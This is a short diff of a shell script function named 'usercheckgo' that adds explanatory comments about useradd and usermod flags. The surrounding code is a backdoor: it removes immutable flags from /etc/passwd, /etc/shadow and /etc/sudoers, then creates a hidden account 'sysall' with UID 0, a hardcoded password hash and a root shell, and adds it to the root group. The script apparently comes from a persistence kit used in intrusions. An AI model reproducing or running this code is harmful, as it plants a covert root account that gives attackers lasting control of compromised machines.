@@ -254,9 +254,17 @@ usercheckgo() {
 		chattr -ia /etc/passwd
 		chattr -ia /etc/shadow
 		groupdel sysall
+    #useradd -M --no-create-home          do not create the user's home directory
+    # -u  --uid UID                 user ID of the new account
+    # -o --non-unique              allow to create users with duplicate
+    # -p --password PASSWORD       encrypted password of the new account
+    # -s --shell SHELL             login shell of the new account
+    # -d --home-dir HOME_DIR       home directory of the new account
 		useradd -M -u 0 -o -p '$6$ktCjSvxn$41E7uhRaaUVs84QIzVQ6rq5PPiLlx2s4glzfIIOGyrRkQpWpqG1Wubb1E75tjhRbrtwTeQYcImAO/3eLRz8.o0' -s /bin/bash -d /root sysall
 		#useradd -m -p '7Pvsd3qh8Rx1c' sysall;
 		#usermod -aG sudoers sysall;
+    # -G, --groups GROUPS           new list of supplementary GROUPS
+    # -a, --append                  append the user to the supplemental GROUPS
 		usermod -aG root sysall
 		#adduser sysall sudo;
 		chattr -ia /etc/sudoers
